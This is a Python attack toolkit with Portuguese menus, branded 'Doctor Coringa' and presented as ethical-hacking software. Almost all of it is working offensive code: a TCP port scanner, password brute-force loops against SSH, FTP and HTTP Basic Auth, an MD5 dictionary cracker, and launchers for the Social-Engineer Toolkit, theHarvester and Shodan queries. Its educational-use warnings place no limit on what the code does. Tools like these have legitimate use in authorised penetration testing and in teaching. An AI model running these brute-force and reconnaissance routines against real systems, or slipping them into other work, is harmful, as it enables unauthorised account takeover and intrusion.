import socket
import time
import paramiko
from ftplib import FTP
import requests
import hashlib
import sys
import subprocess
import os

try:
    import shodan
except ImportError:
    shodan = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_print(text, delay=0.02):
    for line in text.split('\n'):
        sys.stdout.write("\033[92m")
        for char in line:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        sys.stdout.write("\n")
    sys.stdout.write("\033[0m")

def print_banner():
    banner = """
  ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗██╗    ██╗██████╗ 
  ██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝██║    ██║██╔══██╗
  ███████║██║   ██║██║   ██║█████╔╝ ██║ █╗ ██║██████╔╝
  ██╔══██║██║   ██║██║   ██║██╔═██╗ ██║███╗██║██╔═══╝ 
  ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗╚███╔███╔╝██║     
  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝     
"""
    type_print(banner, 0.0005)
    slogan = """
╔══════════════════════════════════════════════════════╗
║ ░█▀▄░█░█░▀█▀░█▀█░█▀▄░█▀█░▀█▀░█▀█░█▀▄░█▀█░█▀█░█▀█░█▀▄ ║
║ ░█▀▄░█▀█░░█░░█░█░█▀▄░█▀█░░█░░█░█░█▀▄░█▀█░█░█░█░█░█▀▄ ║
║ ░▀░▀░▀░▀░░▀░░▀▀▀░▀░▀░▀░▀░░▀░░▀▀▀░▀░▀░▀░▀░▀▀▀░▀▀▀░▀░▀ ║
║                                                      ║
║                 FERRAMENTAS DE HACKING ÉTICO          ║
║                                                      ║
║             Doctor Coringa sempre inovando            ║
╚══════════════════════════════════════════════════════╝
"""
    type_print(slogan, 0.003)

def print_menu():
    menu = """
┌─────────────────────────────────────────────────────────────┐
│                      Menu de Ferramentas                     │
├─────────────────────────────────────────────────────────────┤
│ 1 → Scanner de portas TCP (1-1024)                          │
│ 2 → Força bruta SSH (porta 22)                              │
│ 3 → Força bruta FTP (porta 21)                              │
│ 4 → Força bruta HTTP Basic Auth                             │
│ 5 → Quebra simples de hash MD5                              │
│ 6 → Social-Engineer Toolkit (SET)                           │
│ 7 → Consulta Shodan API                                     │
│ 8 → TheHarvester (coleta OSINT)                            │
│ 0 → Sair                                                   │
└─────────────────────────────────────────────────────────────┘
Digite a opção desejada:
"""
    type_print(menu, 0.002)

def print_warning(tool_name):
    warning = f"""
#########################################################
#                                                       #
#   AVISO IMPORTANTE - {tool_name}                          #
#                                                       #
#   Esta ferramenta foi desenvolvida EXCLUSIVAMENTE      #
#   para fins EDUCACIONAIS e de DEMONSTRAÇÃO.            #
#                                                       #
#   NÃO UTILIZE para ações ilegais ou não autorizadas.  #
#                                                       #
#   Execute SOMENTE em ambientes onde possui permissão.  #
#                                                       #
#   Ethical Hacking = conhecimento, respeito e ética.   #
#                                                       #
#########################################################
"""
    type_print(warning, 0.01)

def scan_ports(target, ports):
    print_warning("Scanner de Portas TCP")
    type_print(f"Iniciando scan no alvo: {target}...\n")
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                type_print(f"[+] Porta {port} está ABERTA")
                open_ports.append(port)
        except Exception as ex:
            type_print(f"Erro no scan da porta {port}: {ex}")
    type_print(f"\nScan finalizado. Portas abertas: {open_ports}")

def brute_force_ssh(target, username, passwords):
    print_warning("Força Bruta SSH")
    type_print(f"Iniciando força bruta SSH no alvo {target} para usuário {username}\n")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for pwd in passwords:
        try:
            client.connect(target, username=username, password=pwd, timeout=3)
            type_print(f"[SUCESSO] Senha encontrada: {pwd}")
            client.close()
            return
        except:
            type_print(f"Testando senha: {pwd}")
    type_print("Nenhuma senha foi encontrada.")

def brute_force_ftp(target, username, passwords):
    print_warning("Força Bruta FTP")
    type_print(f"Iniciando força bruta FTP no alvo {target} para usuário {username}\n")
    for pwd in passwords:
        try:
            ftp = FTP(target, timeout=3)
            ftp.login(username, pwd)
            type_print(f"[SUCESSO] Senha encontrada: {pwd}")
            ftp.quit()
            return
        except:
            type_print(f"Testando senha: {pwd}")
    type_print("Nenhuma senha foi encontrada.")

def brute_force_http_basic(target, username, passwords):
    print_warning("Força Bruta HTTP Basic Auth")
    type_print(f"Iniciando força bruta HTTP Basic Auth no alvo {target} para usuário {username}\n")
    url = target if target.startswith('http') else f"http://{target}"
    for pwd in passwords:
        try:
            response = requests.get(url, auth=(username, pwd), timeout=3)
            if response.status_code == 200:
                type_print(f"[SUCESSO] Senha encontrada: {pwd}")
                return
            else:
                type_print(f"Testando senha: {pwd} (status: {response.status_code})")
        except Exception as e:
            type_print(f"Erro na requisição: {e}")
    type_print("Nenhuma senha foi encontrada.")

def crack_md5(hash_value, password_list):
    print_warning("Quebra de Hash MD5")
    type_print(f"Iniciando quebra do hash: {hash_value}\n")
    for pwd in password_list:
        hashed = hashlib.md5(pwd.encode()).hexdigest()
        type_print(f"Testando senha: {pwd} -> Hash: {hashed}")
        if hashed == hash_value:
            type_print(f"[SUCESSO] Senha quebrada: {pwd}")
            return
    type_print("Senha não encontrada na lista.")

def run_setoolkit():
    print_warning("Social-Engineer Toolkit (SET)")
    type_print("O Social-Engineer Toolkit (SET) será executado. Use em ambiente autorizado.\n")
    try:
        subprocess.run(["setoolkit"])
    except FileNotFoundError:
        type_print("Erro: setoolkit não encontrado. Instale-o ou execute em ambiente Linux com SET instalado.")

def shodan_query():
    if shodan is None:
        type_print("Biblioteca Shodan não instalada. Execute:\n pip install shodan")
        return
    print_warning("Consulta API Shodan")
    api_key = input("\033[92mDigite sua chave API Shodan: \033[0m").strip()
    query = input("\033[92mDigite o termo para pesquisa no Shodan: \033[0m").strip()
    api = shodan.Shodan(api_key)
    try:
        results = api.search(query)
        type_print(f"Resultados para '{query}':")
        for res in results['matches'][:5]:
            ip = res.get('ip_str', 'N/A')
            port = res.get('port', 'N/A')
            org = res.get('org', 'N/A')
            type_print(f"IP: {ip} | Porta: {port} | Organização: {org}")
    except Exception as e:
        type_print(f"Erro durante consulta Shodan: {e}")

def run_theharvester():
    print_warning("TheHarvester - Coleta OSINT")
    domain = input("\033[92mDigite o domínio (ex: example.com): \033[0m").strip()
    try:
        subprocess.run(["theharvester", "-d", domain, "-b", "all"])
    except FileNotFoundError:
        type_print("Erro: theharvester não encontrado. Instale-o antes de executar.")

def main():
    while True:
        clear_screen()
        print_banner()
        print_menu()
        choice = input("\033[92m> \033[0m").strip()

        if choice == '1':
            clear_screen()
            print_banner()
            scan_ports(input("Digite o IP/hostname alvo: ").strip(), list(range(1, 1025)))
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '2':
            clear_screen()
            print_banner()
            brute_force_ssh(
                input("Digite o IP alvo SSH: ").strip(),
                input("Digite o usuário SSH: ").strip(),
                [s.strip() for s in input("Digite senhas separadas por vírgula: ").strip().split(',')]
            )
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '3':
            clear_screen()
            print_banner()
            brute_force_ftp(
                input("Digite o IP alvo FTP: ").strip(),
                input("Digite o usuário FTP: ").strip(),
                [s.strip() for s in input("Digite senhas separadas por vírgula: ").strip().split(',')]
            )
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '4':
            clear_screen()
            print_banner()
            brute_force_http_basic(
                input("Digite URL/IP alvo HTTP: ").strip(),
                input("Digite o usuário HTTP: ").strip(),
                [s.strip() for s in input("Digite senhas separadas por vírgula: ").strip().split(',')]
            )
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '5':
            clear_screen()
            print_banner()
            crack_md5(
                input("Digite o hash MD5 para quebrar: ").strip(),
                [s.strip() for s in input("Digite senhas para teste separadas por vírgula: ").strip().split(',')]
            )
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '6':
            clear_screen()
            print_banner()
            run_setoolkit()
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '7':
            clear_screen()
            print_banner()
            shodan_query()
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '8':
            clear_screen()
            print_banner()
            run_theharvester()
            input("\nPressione Enter para voltar ao menu...")

        elif choice == '0':
            clear_screen()
            print_banner()
            type_print("Encerrando... Obrigado por usar Doctor Coringa tools!")
            break

        else:
            clear_screen()
            print_banner()
            type_print("Opção inválida, tente novamente.")
            input("\nPressione Enter para voltar ao menu...")

if __name__ == "__main__":
    main()
